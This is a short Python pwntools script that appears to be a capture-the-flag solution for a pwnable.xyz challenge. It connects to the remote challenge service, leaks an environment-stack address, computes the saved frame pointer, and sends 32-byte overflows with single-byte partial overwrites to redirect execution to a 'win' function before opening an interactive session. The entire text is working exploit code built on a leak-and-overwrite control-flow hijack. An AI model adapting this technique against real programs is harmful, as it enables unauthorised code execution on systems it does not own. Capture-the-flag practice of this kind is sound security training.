from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30012)
win = 0xB77
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

sla('>','3')
env = int(p.recvline().strip(),16)
log.info('environ : {}'.format(hex(env)))
rbp = env - 248
log.info('rbp : {}'.format(hex(rbp)))

sa('>','A'*32+p8((rbp&0xff)+9))
sa('>',str(win&0xff))
sa('>','A'*32+p8(rbp&0xff))
sa('>','1')

p.interactive()